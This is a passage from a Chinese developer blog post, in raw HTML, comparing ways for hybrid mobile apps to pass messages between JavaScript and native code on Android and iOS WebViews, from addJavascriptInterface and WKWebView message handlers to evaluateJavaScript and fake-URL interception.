punctuation">,</span>    params<span class="token punctuation">:</span><span class="token string">'xxxx'</span><span class="token punctuation">,</span>    callback<span class="token punctuation">:</span><span class="token string">'xxxx'</span><span class="token punctuation">,</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//直接使用这个客户端注入的函数</span><span class="token function">callNativeFunction</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>在没经过客户端注入的时候，直接使用调用callNativeFunction()会报 callNativeFunction is not defined这个错误，说明此时JS上下全文全局，是没有这个函数的，调用无效</p><p>当执行完客户端注入的时候，此时JS上下文全局global下面，就拥有了这个callNativeFunction的函数对象，就可以正常调用，从而传递数据到Native</p><h3 id="安卓addJavascriptInterface注入"><a href="#安卓addJavascriptInterface注入" class="headerlink" title="安卓addJavascriptInterface注入"></a><strong>安卓addJavascriptInterface注入</strong></h3><p>安卓的WebView有一个接口addJavascriptInterface，可以在loadUrl之前提前准备一个对象，通过这个接口注入给JS上下文，从而让JS能够操作，这个操作方式很类似苹果UIWebview JavaScriptCore注入，整个机制也差别不离，但有个很重大的区别，后面在详述优缺点对比的时候，会重点描述</p><h3 id="安卓addJavascriptInterface注入-客户端注入"><a href="#安卓addJavascriptInterface注入-客户端注入" class="headerlink" title="安卓addJavascriptInterface注入 - 客户端注入"></a><strong>安卓addJavascriptInterface注入 - 客户端注入</strong></h3><p>使用安卓官方的API接口即可，并且可以在loadUrl之前WebView创建之后，即可配置相关注入功能，这个和UIWebView-JSContext的使用差异非常之大，后面会说</p><pre class="line-numbers language-js"><code class="language-js"><span class="token comment" spellcheck="true">// 通过addJavascriptInterface()将Java对象映射到JS对象</span><span class="token comment" spellcheck="true">//参数1：Javascript对象名</span><span class="token comment" spellcheck="true">//参数2：Java对象名</span>mWebView<span class="token punctuation">.</span><span class="token function">addJavascriptInterface</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">AndroidtoJs</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"nativeObject"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>其中AndroidtoJs这个是一个自定义的安卓对象，他们里面有个函数callFunction，AndroidtoJs这个对象的其他函数方法JS都可以调用</p><h3 id="安卓addJavascriptInterface注入-JS调用"><a href="#安卓addJavascriptInterface注入-JS调用" class="headerlink" title="安卓addJavascriptInterface注入 - JS调用"></a><strong>安卓addJavascriptInterface注入 - JS调用</strong></h3><p>刚才注入的js对象叫nativeObject，所以JS中可以在全局任意使用</p><pre class="line-numbers language-js"><code class="language-js"><span class="token template-string"><span class="token string">`nativeObject.callFunction("js调用了android中的hello方法");`</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>我不是很熟悉android，以上很多安卓代码都取自 <a href="https://link.juejin.im/?target=http%3A%2F%2Fblog.csdn.net%2Fcarson_ho%2Farticle%2Fdetails%2F64904691" target="_blank" rel="noopener">Android：你要的WebView与 JS 交互方式 都在这里了</a>，后面也会纳入参考文献之中</p><h3 id="苹果WKWebView-scriptMessageHandler注入"><a href="#苹果WKWebView-scriptMessageHandler注入" class="headerlink" title="苹果WKWebView scriptMessageHandler注入"></a><strong>苹果WKWebView scriptMessageHandler注入</strong></h3><p>苹果在开放WKWebView这个性能全方位碾压UIWebView的web组件后，也大幅更改了JS与Native交互的方式，提供了专有的交互APIscriptMessageHandler</p><p>因为这是苹果的API，使用方式搜一下一搜一大堆，我并不详细解释了，直接展示一下代码</p><h3 id="苹果WKWebView-scriptMessageHandler注入-客户端注入"><a href="#苹果WKWebView-scriptMessageHandler注入-客户端注入" class="headerlink" title="苹果WKWebView scriptMessageHandler注入 - 客户端注入"></a><strong>苹果WKWebView scriptMessageHandler注入 - 客户端注入</strong></h3><pre class="line-numbers language-js"><code class="language-js"><span class="token comment" spellcheck="true">//配置对象注入</span><span class="token punctuation">[</span>self<span class="token punctuation">.</span>webView<span class="token punctuation">.</span>configuration<span class="token punctuation">.</span>userContentController addScriptMessageHandler<span class="token punctuation">:</span>self name<span class="token punctuation">:</span>@<span class="token string">"nativeObject"</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//移除对象注入</span><span class="token punctuation">[</span>self<span class="token punctuation">.</span>webView<span class="token punctuation">.</span>configuration<span class="token punctuation">.</span>userContentController removeScriptMessageHandlerForName<span class="token punctuation">:</span>@<span class="token string">"nativeObject"</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>需要说明一下，addScriptMessageHandler就像安卓的addJavascriptInterface一样，可以在WKWebView loadUrl之前即可进行相关配置</p><p>但不一样的是，如果当前WebView没用了，需要销毁，需要先移除这个对象注入，否则会造成内存泄漏，WebView和所在VC循环引用，无法销毁。</p><h3 id="苹果WKWebView-scriptMessageHandler注入-JS调用"><a href="#苹果WKWebView-scriptMessageHandler注入-JS调用" class="headerlink" title="苹果WKWebView scriptMessageHandler注入 - JS调用"></a><strong>苹果WKWebView scriptMessageHandler注入 - JS调用</strong></h3><p>刚才注入的js对象叫nativeObject，但不像前边两个注入一样，直接注入到JS上下文全局Global对象里，addScriptMessageHandler方法注入的对象被放到了，全局对象下一个Webkit对象下面，想要拿到这个对象需要这样拿</p><pre class="line-numbers language-js"><code class="language-js"><span class="token template-string"><span class="token string">`window.webkit.messageHandlers.nativeObject`</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>并且和之前的两种注入也不同，前两种注入都可以让js任意操作所注入自定义对象的所有方法，而addScriptMessageHandler注入其实只给注入对象起了一个名字nativeObject，但这个对象的能力是不能任意指定的，只有一个函数postMessage，因此JS的调用方式也只能是</p><pre class="line-numbers language-js"><code class="language-js"><span class="token comment" spellcheck="true">//准备要传给native的数据，包括指令，数据，回调等</span><span class="token keyword">var</span> data <span class="token operator">=</span> <span class="token punctuation">{</span>    action<span class="token punctuation">:</span><span class="token string">'xxxx'</span><span class="token punctuation">,</span>    params<span class="token punctuation">:</span><span class="token string">'xxxx'</span><span class="token punctuation">,</span>    callback<span class="token punctuation">:</span><span class="token string">'xxxx'</span><span class="token punctuation">,</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//传递给客户端</span>window<span class="token punctuation">.</span>webkit<span class="token punctuation">.</span>messageHandlers<span class="token punctuation">.</span>nativeObject<span class="token punctuation">.</span><span class="token function">postMessage</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="苹果WKWebView-scriptMessageHandler注入-客户端接收调用"><a href="#苹果WKWebView-scriptMessageHandler注入-客户端接收调用" class="headerlink" title="苹果WKWebView scriptMessageHandler注入 - 客户端接收调用"></a><strong>苹果WKWebView scriptMessageHandler注入 - 客户端接收调用</strong></h3><p>前两种注入方式，都是在注入的时候，就指定了对应的接收JS调用的Native函数，但是这次不是，在苹果的API设计里，当JS开始调用后，会调用到指定的iOS的delegate里</p><pre class="line-numbers language-js"><code class="language-js"><span class="token operator">-</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span>userContentController<span class="token punctuation">:</span><span class="token punctuation">(</span>WKUserContentController <span class="token operator">*</span><span class="token punctuation">)</span>userContentController didReceiveScriptMessage<span class="token punctuation">:</span><span class="token punctuation">(</span>WKScriptMessage <span class="token operator">*</span><span class="token punctuation">)</span>message<span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">//1 解读JS传过来的JSValue  data数据</span>    NSDictionary <span class="token operator">*</span>msgBody <span class="token operator">=</span> message<span class="token punctuation">.</span>body<span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">//2 取出指令参数，确认要发起的native调用的指令是什么</span>    <span class="token comment" spellcheck="true">//3 取出数据参数，拿到JS传过来的数据</span>    <span class="token comment" spellcheck="true">//4 根据指令调用对应的native方法，传递数据</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="Native-调用-JS-的几种通信方案-1"><a href="#Native-调用-JS-的几种通信方案-1" class="headerlink" title="Native 调用 JS 的几种通信方案"></a>Native 调用 JS 的几种通信方案</h2><p>说完了JS调用Native，我们再聊聊Native发起调用JS</p><h3 id="evaluatingJavaScript-执行JS代码"><a href="#evaluatingJavaScript-执行JS代码" class="headerlink" title="evaluatingJavaScript 执行JS代码"></a><strong>evaluatingJavaScript 执行JS代码</strong></h3><p>上面也简单说了一下，JS是一个脚本语言，可以在无需编译的情况下，直接输入字符串JS代码，直接运行执行看结果，这也是为什么在Chrome里，在网页运行的时候打开控制台，可以输入各种JS指令的看结果的。</p><p>也就是说当Native想要调用JS的时候，可以由Native把需要数据与调用的JS函数，通过字符串拼接成JS代码，交给WebView进行执行</p><p>说明一下，Android/iOS-UIWebView/iOS-WKWebView，都支持这种方法，这是目前最广泛运用的方法，甚至可以说，Chrome的DevTools控制台也是用的同样的方式。</p><p>假如JS网页里已经有了这么一个函数</p><pre class="line-numbers language-js"><code class="language-js"><span class="token keyword">function</span> <span class="token function">calljs</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">{</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>JSON<span class="token punctuation">.</span><span class="token function">parse</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">)</span>     <span class="token comment" spellcheck="true">//1 识别客户端传来的数据</span>    <span class="token comment" spellcheck="true">//2 对数据进行分析，从而调用或执行其他逻辑  </span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>那么客户端此时要调用他需要在客户端用OC拼接字符串，拼出一个js代码，传递的数据用json</p><pre class="line-numbers language-js"><code class="language-js"><span class="token comment" spellcheck="true">//不展开了,data是一个字典，把字典序列化</span>NSString <span class="token operator">*</span>paramsString <span class="token operator">=</span> <span class="token punctuation">[</span>self _serializeMessageData<span class="token punctuation">:</span>data<span class="token punctuation">]</span><span class="token punctuation">;</span>NSString<span class="token operator">*</span> javascriptCommand <span class="token operator">=</span> <span class="token punctuation">[</span>NSString stringWithFormat<span class="token punctuation">:</span>@<span class="token string">"calljs('%@');"</span><span class="token punctuation">,</span> paramsString<span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//要求必须在主线程执行JS</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">[</span>NSThread currentThread<span class="token punctuation">]</span> isMainThread<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token punctuation">[</span>self<span class="token punctuation">.</span>webView evaluateJavaScript<span class="token punctuation">:</span>javascriptCommand completionHandler<span class="token punctuation">:</span>nil<span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>    __strong <span class="token keyword">typeof</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span>strongSelf <span class="token operator">=</span> self<span class="token punctuation">;</span>    <span class="token function">dispatch_sync</span><span class="token punctuation">(</span><span class="token function">dispatch_get_main_queue</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token operator">^</span><span class="token punctuation">{</span>        <span class="token punctuation">[</span>strongSelf<span class="token punctuation">.</span>webView evaluateJavaScript<span class="token punctuation">:</span>javascriptCommand completionHandler<span class="token punctuation">:</span>nil<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>其实我们拼接出来的js只是一行js代码，当然无论多长多复杂的js代码都可以用这个方式让webview执行</p><pre class="line-numbers language-js"><code class="language-js"><span class="token template-string"><span class="token string">`calljs('{data:xxx,data2:xxx}');`</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><p>TIPS:安卓4.4以上才可以使用evaluatingJavaScript这个API</p></blockquote><h3 id="loadUrl-执行JS代码"><a href="#loadUrl-执行JS代码" class="headerlink" title="loadUrl 执行JS代码"></a><strong>loadUrl 执行JS代码</strong></h3><p>安卓在4.4以前是不能用evaluatingJavaScript这个方法的，因此之前安卓都用的是webview直接loadUrl，但是传入的url并不是一个链接，而是以”javascript:”开头的js代码，从而达到让webview执行js代码的作用</p><p>其实这个过程和evaluatingJavaScript没啥差异</p><p>还按着刚才举例，假如JS网页里已经有了这么一个函数</p><pre class="line-numbers language-js"><code class="language-js"><span class="token keyword">function</span> <span class="token function">calljs</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">{</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>JSON<span class="token punctuation">.</span><span class="token function">parse</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">)</span>     <span class="token comment" spellcheck="true">//1 识别客户端传来的数据</span>    <span class="token comment" spellcheck="true">//2 对数据进行分析，从而调用或执行其他逻辑  </span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>我不太熟悉安卓，就不写安卓的字典数据json序列化的逻辑了</p><pre class="line-numbers language-js"><code class="language-js"><span class="token template-string"><span class="token string">`mWebView.loadUrl("javascript:callJS(\'{data:xxx,data2:xxx}\')");`</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>最终实际上相当于执行了一条js代码</p><pre class="line-numbers language-js"><code class="language-js"><span class="token template-string"><span class="token string">`calljs('{data:xxx,data2:xxx}');`</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="WKUserScript-执行JS代码"><a href="#WKUserScript-执行JS代码" class="headerlink" title="WKUserScript 执行JS代码"></a><strong>WKUserScript 执行JS代码</strong></h3><p>对于iOS的WKWebView，除了evaluatingJavaScript，还有WKUserScript这个方式可以执行JS代码，他们之间是有区别的</p><ul><li>evaluatingJavaScript 是在客户端执行这条代码的时候立刻去执行当条JS代码</li><li>WKUserScript 是预先准备好JS代码，当WKWebView加载Dom的时候，执行当条JS代码</li></ul><p>很明显这个虽然是一种通信方式，但并不能随时随地进行通信，并不适合选则作为设计bridge的核心方案。但这里也简单介绍一下</p><pre class="line-numbers language-js"><code class="language-js"><span class="token comment" spellcheck="true">//在loadurl之前使用</span><span class="token comment" spellcheck="true">//time是一个时机参数，可选dom开始加载/dom加载完毕，2个时机进行执行JS</span><span class="token comment" spellcheck="true">//构建userscript</span>WKUserScript <span class="token operator">*</span>script <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">[</span>WKUserScript alloc<span class="token punctuation">]</span>initWithSource<span class="token punctuation">:</span>source injectionTime<span class="token punctuation">:</span>time forMainFrameOnly<span class="token punctuation">:</span>mainOnly<span class="token punctuation">]</span><span class="token punctuation">;</span>WKUserContentController <span class="token operator">*</span>userController <span class="token operator">=</span> webView<span class="token punctuation">.</span>userContentController<span class="token punctuation">;</span><span class="token comment" spellcheck="true">//配置userscript</span><span class="token punctuation">[</span>userController addUserScript<span class="token punctuation">:</span>script<span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="几种通信方式的优缺点对比"><a href="#几种通信方式的优缺点对比" class="headerlink" title="几种通信方式的优缺点对比"></a>几种通信方式的优缺点对比</h2><p>说完了JS主动调用Native，也说完了Native主动调用JS，有很多很多的方案我们来聊聊这么些个方案都有哪些局限性，是否值得我们选择</p><h3 id="假请求的通信拦截的问题-–-当下最不该选择的通信方式"><a href="#假请求的通信拦截的问题-–-当下最不该选择的通信方式" class="headerlink" title="假请求的通信拦截的问题 – 当下最不该选择的通信方式"></a><strong>假请求的通信拦截的问题 – 当下最不该选择的通信方式</strong></h3><p>假通信拦截请求这种方式看起来是使用最广泛的，知名的<a href="https://link.juejin.im/?target=https%3A%2F%2Fgithub.com%2Fmarcuswestin%2FWebViewJavascriptBridge" target="_blank" rel="noopener">WebViewJavascriptBridge</a> 和<a href="https://link.juejin.im/?target=http%3A%2F%2Fcordova.axuer.com%2F" target="_blank" rel="noopener">cordova</a></p><p>为什么这些知名框架选用假请求通信拦截其实有很多原因，但我想说的是，基于眼下设计自己的Hybrid框架，最不应该选择的通信方式就是假请求通信拦截</p><h3 id="先说说他为数不多的优点："><a href="#先说说他为数不多的优点：" class="headerlink" title="先说说他为数不多的优点："></a><strong>先说说他为数不多的优点：</strong></h3><ul><li>版本兼容性好：iOS6及以前只有这唯一的一种方式</li></ul><p>cordova的前身是phonegap，随手搜一下大概能知道这个框架有多老，也可以看下WebViewJavascriptBridge，最早第一次提交是在5年前，在没有iOS7的时候，有切只有这唯一的一种通信方式，因此他们都选用了他，但看一眼现在已经iOS11了，再看看iOS6及以下的占有度，呵呵，一到iOS7就有更好的全方位碾压的bridge方式了</p><ul><li>webview支持度好：简单地说框架的开发者容易偷懒</li></ul><p>这是所有JS call Native的通信方式里，唯一同时支持安卓webview/苹果UIWebView/苹果WKWebView的一种通信方式，这也就是为什么WebViewJavascriptBridge在即便苹果已经推出了更好的WKWebView并且准备了专属的通信APImessageHandler的时候，还依然选择继续沿用假请求通信拦截的原因，代码不用重写了，适合写那种兼容iOS7以下的UIWebView，在iOS8以上换WKWebView的代码，但看一眼现在的版本占有度？没有任何意义</p><p><strong>多说两句：</strong></p><p>即便是老项目还在使用UIWebView，要计划升级到WKWebView的时候，既然是升级就应该全面升级到新的WK式通信，做什么妥协和折中方案？</p><p>而且最重要的一点，想要做到同时支持多个WebView兼容支持并不需要选择妥协方案，在开发框架的时候完全可以在框架侧解决。想要屏蔽这种webview通信差异，通过在Hybrid框架层设计，抽象统一的调用入口出口，把通信差异在内部消化，这样依然能做到统一对外业务代码流程和清晰的代码逻辑，想要做到代码统一不应该以功能上牺牲和妥协的方面去考虑。</p><p>要知道<a href="https://link.juejin.im/?target=http%3A%2F%2Fcordova.axuer.com%2F" target="_blank" rel="noopener">cordova</a>都专门为WKWebView开发了独有的<a href="https://link.juejin.im/?target=https%3A%2F%2Fwww.npmjs.com%2Fpackage%2Fcordova-plugin-wkwebview" target="_blank" rel="noopener">cordova-plugin-wkwebview</a>插件来专门适配WKWebView的更优的官方通信API，而不是像<a href="https://link.juejin.im/?target=https%3A%2F%2Fgithub.com%2Fmarcuswestin%2FWebViewJavascriptBridge" target="_blank" rel="noopener">WebViewJavascriptBridge</a>进行妥协，UI与WK都采取同一种有功能性问题的通信方案</p><h3 id="再说说他最严重的缺点："><a href="#再说说他最严重的缺点：" class="headerlink" title="再说说他最严重的缺点："></a><strong>再说说他最严重的缺点：</strong></h3><ul><li>丢消息！ 一个通信方案，结果他最大的问题是丢失通信消息！</li></ul><pre class="line-numbers language-js"><code class="language-js">location<span class="token punctuation">.</span>href <span class="token operator">=</span> <span class="token string">'wubacst://wahahalalala/callNativeNslog?param=1111'</span>location<span class="token punctuation">.</span>href <span class="token operator">=</span> <span class="token string">'wubacst://wahahalalala/callNativeNslog?param=2222'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>上面是一段JS调用Native的代码，可以靠字面意思猜一下，JS此时的诉求是在同一个运行逻辑内，快速的连续发送出2个通信请求，用客户端本身IDE的log，按顺序打印111，222，那么实际结果是222的通信消息根本收不到，直接会被系统抛弃丢掉。</p><p>原因：因为假跳转的请求归根结底是一种模拟跳转，跳转这件事情上webview会有限制，当JS连续发送多条跳转的时候，webview会直接过滤掉后发的跳转请求，因此第二个消息根本收不到，想要收到怎么办？JS里将第二条消息延时一下</p><pre class="line-numbers language-js"><code class="language-js"><span class="token comment" spellcheck="true">//发第一条消息</span>location<span class="token punctuation">.</span>href <span class="token operator">=</span> <span class="token string">'wakaka://wahahalalala/callNativeNslog?param=1111'</span><span class="token comment" spellcheck="true">//延时发送第二条消息</span><span class="token function">setTimeout</span><span class="token punctuation">(</span><span class="token number">500</span><span class="token punctuation">,</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    location<span class="token punctuation">.</span>href <span class="token operator">=</span> <span class="token string">'wakaka://wahahalalala/callNativeNslog?param=2222'</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这根本治标不治本好么，这种框架设计下决定了JS在任何通信逻辑都得考虑是否这个时间有其他的JS通信代码刚交互过，导致消息丢失？是否页面加载完毕的时候不能同时发送页面加载完毕和其他具体业务需要的Native消息，是否任何一个AJax网络请求回来后立刻发起的Native消息，都要谨慎考虑与此同时是否有别的SetTimeout也在发Native消息导致冲突？这TM根本是一个天坑，这么设计绝对是客户端开发舒坦省事写bridge框架代码，坑死天天做活动上线的前端同学的。</p><p>如果想继续使用假跳转请求，又不想换方案怎么办？前端同学在JS框架层包一层队列，所有JS代码调用消息都先进入队列并不立刻发送，然后前端会周期性比如500毫秒，清空flush一次队列，保证在很快的时间内绝对不会连续发2次假请求通信，这种通信队列的设计不光运用解决丢消息的问题，就连RN根本没丢消息问题的JSCore式的通信，也采用了这种方式，归根结底他能减少通信开销，但是！但是！给假通信请求做队列你将面临第二个根本没法解决的问题</p><ul><li>URL长度限制</li></ul><p>假跳转请求归根结底他还是一个跳转，抛给客户端被拦截的时候都已经被封装成一个request了，那么如果url超长了呢？那么这个request里的url的内容还是你想要传递的原内容么？不会丢内容么？尤其是当你采用了队列控制，一次性发送的是多条消息组成的数组数据的时候。</p><p>假跳转是现在这个时候最不该使用的通信方式！！！</p><p>假跳转是现在这个时候最不该使用的通信方式！！！</p><p>假跳转是现在这个时候最不该使用的通信方式！！！</p><p>重要的事情说三遍</p><p><strong>弹窗拦截</strong></p><p>这个方式其实没啥不好的，而且confirm还可以用更简单的方式处理callback回调，因为confirm天然是需要返回JS内容的，但callback其实也可以用其他的方式实现，也许更好，因此这里按住不表，第二篇文章会整体聊聊，基于这么多种通信手段，如何设计一个自己的Hybrid框架</p><ul><li>UIWebView不支持，但没事UIWebView有更好的JS上下文注入的方式，JSContext不仅支持直接传递对象无需json序列化，还支持传递function函数给客户端呢</li><li>安卓一切正常，不会出现丢消息的情况</li><li>WKWebView一切正常，也不会出现丢消息的情况，但其实WKWebView苹果给了更好的API，何不用那个，至少用这个是可以直接传递对象无需进行json序列化的</li></ul><p>唯一需要注意的一点，如果你的业务开发中经常希望在前端代码里使用系统alert()/confirm()/prompt()那么，你还是挑一个不常用的进行hook，以免干扰常规业务</p><p><strong>JS上下文注入</strong></p><p>JS上下文注入其实一共3种情况，这3种情况每个情况都不同，我会一一进行优缺点说明</p><p><strong>UIWebView的JSContext注入</strong></p><p>说实话这是我觉得最完美的一种交互方式了，苹果在iOS7开放了JavaScriptCore这个框架，支撑起了RN，Weex这么牛逼的摆脱了WebView的深度混合框架，他的能力是最完美的。</p><p><strong>牛逼的优点:</strong></p><ul><li>支持JS同步返回！</li></ul><p>要知道我们看到的所有JS通信框架设计的都是异步返回，包括RN（这有设计原因，但不代表JSC不支持同步返回），都是设计了一套callback机制，一条通信消息到达Native后，如果需要返回数据，需要调用这个callback接口由Native反向通知JS，他们在JS侧写代码可是差异非常非常非常之大的！</p><pre class="line-numbers language-js"><code class="language-js"><span class="token comment" spellcheck="true">//同步JS调用Native  JS这边可以直接写 =  !!!</span><span class="token keyword">var</span> nativeNetStatus <span class="token operator">=</span> nativeObject<span class="token punctuation">.</span><span class="token function">getNetStatus</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//异步JS调用Native JS只能这么写</span>nativeObject<span class="token punctuation">.</span><span class="token function">getNetSatus</span><span class="token punctuation">(</span><span class="token function">callback</span><span class="token punctuation">(</span>net<span class="token punctuation">)</span><span class="token punctuation">{</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>net<span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li>支持直接传递对象，无需通过字符串序列化</li></ul><p>一个JS对象在JS代码中如果想通过假跳转/弹窗拦截等方式，那么必须把JS对象搞成json，然后才能传递给端，端拿到后还要反解成字典对象，然后才能识别，但是JS上下文注入不需要（其实他本质上是框架层帮你做了这件事情，就是JSValue这个iOS类的能力）</p><ul><li>支持传递JS函数，客户端能够直接快速调用callback</li></ul><p>在JS里如果是一个function，可以直接当做参数发送给客户端，在客户端得到一个JSValue，可以通过JSValue的callWithParmas的方式直接当做函数去调用</p><ul><li>支持直接注入任意客户端类，客户端对象，JS可以直接向调用客户端</li></ul><p>JavaScriptCore有一种使用方法，是可以让任意iOS对象，遵循协议，就可以直接把一整个Native对象直接注入，让JS可以直接操作这个对象，读取这个对象的属性，调用这个对象的方法</p><p><strong>有点尴尬的缺点：</strong></p><ul><li>only UIWebView</li></ul><p>这一点简直是最大的遗憾，只有UIWebView可以用KVC取到JSContext，取到了JSContext才能发挥JavaScriptCore的牛逼能力，但是如果为了更好的性能升级到了WKWebView，那就得忍痛，我依稀记得曾几何时我在哪看到过通过私有API，让WKWebView也能获取JSContext，但我找不到了，希望知道的同学能给我点指引。但我有一个看法 <strong>为了WKWebView的性能提升，舍弃JSContext的优点，值得！</strong></p><ul><li>JSContext获取时机</li></ul><p>UIWebView的JSContext是通过iOS的kvc方法拿到，而非UIWebView的直接接口API，因此UIWebView-JSContext注入使用上要非常注意注入时机</p><ul><li>UIWebView-JSContext 在loadUrl之前注入无效</li><li>UIWebView-JSContext 在FinishLoad之后注入有效但有延迟</li></ul><p>因为WebView每次加载一个新地址都会启用一个新的JSContext，在loadUrl之前注入，会因为旧的JSContext已被舍弃导致注入无效，若在WebView触发FinishLoad事件的时候注入，又会导致在FinishLoad之前执行的JS代码，是无法调用native通信的</p><p>曾经写过一篇文章<a href="https://link.juejin.im/?target=http%3A%2F%2Fawhisper.github.io%2F2017%2F09%2F09%2FinjectUIWebView%2F" target="_blank" rel="noopener">UIWebView代码注入时机与姿势</a>，可以参考看看，有私有API解决办法，不在这里多言</p><p>如果你还在使用UIWebView，真的应该彻底丢弃什么假跳转，直接使用这个方案（iOS7.0现在已经不是门槛了吧），并且深度开发JavaScriptCore这么多牛逼优势所带来的一些黑科技（我感觉会在第三篇文章里提这个）</p><p>如果你还在使用UIWebView，就用JSContext吧！不要犹豫!</p><p>如果你还在使用UIWebView，就用JSContext吧！不要犹豫!</p><p>如果你还在使用UIWebView，就用JSContext吧！不要犹豫!</p><p><strong>安卓的addJavascriptInterface注入</strong></p><p><strong>我不太了解安卓，因此这粗略写一写，此处如果有错误非常希望大家帮我指出</strong></p><p>安卓的addJavascriptInterface注入，其实原理机制几乎和UIWebView的JSContext注入一样，所以UIWebView的JSContext注入的有点他其实都有</p><ul><li>可以同步返回</li><li>无需json化透传数据</li><li>可以传递函数（不确定）</li><li>可以注入Native对象</li></ul><p>但是安卓的addJavascriptInterface没有注入时机这个缺点（类比-UIWebView的JSContext获取时机），原因是UIWebView缺失一个时机由内核通知外围，当前JSContext刚刚创建完毕，还未开始执行相关JS，导致在iOS下无法在这个最应该进行注入的时机进行注入，除非通过私有API，但安卓没事，安卓系统提供了个API来让外围获得这个最佳时机 onResourceloaded，详细说明见 <a href="https://link.juejin.im/?target=http%3A%2F%2Fawhisper.github.io%2F2017%2F09%2F09%2FinjectUIWebView%2F" target="_blank" rel="noopener">UIWebView代码注入时机与姿势</a></p><p><strong>WKWebView的scriptMessageHandler注入</strong></p><p>苹果iOS8之后官方抓们推出的新一代webview，号称全面优化，性能大幅度提升，是和safari一样的web内核引擎，带着光环出生，而scriptMessageHandler正是这个新WKWebView钦点的交互API</p><p><strong>优点:</strong></p><ul><li>无需json化传递数据</li></ul><p>是的，webkit.messageHandlers.xxx.postMessage()是支持直接传递json数据，无需前端客户端字符串处理的</p><ul><li>不会丢消息</li></ul><p>我们团队的以前老代码在丢消息上吃了无数的大亏，导致我对这个事情耿耿于怀，怨念极深！真是坑了好几代前端开发，叫苦不堪</p><p><strong>缺点：</strong></p><ul><li>版本要求iOS8</li></ul><p>我们舍弃了，不是问题</p><ul><li>不支持JSContext那样的同步返回</li></ul><p>丧失了很多黑科技黑玩法的想象力！但我觉得还是有可能有办法哪怕用私有API的方式想办法找回来的，希望知道的朋友提供更多信息</p><p>如果你已经上了WKWebView，就用它，不需要考虑</p><p>如果你已经上了WKWebView，就用它，不需要考虑</p><p>如果你已经上了WKWebView，就用它，不需要考虑</p><p><strong>evaluatingJavaScript 直接执行JS代码</strong></p><p>说完了JS主动调用Native，我们再说说Native主动调用JS，evaluatingJavaScript是一个非常非常通用普遍的方式了，原因也在介绍里解释过，js的脚本引擎天然支持，直接扔字符串进去，当做js代码开始执行</p><p>也没啥优缺点可以说的，除了有个特性需要在介绍WKUserScript的时候在多解释一下</p><p>安卓/UIWebView/WKWebView都支持</p><p><strong>loadUrl 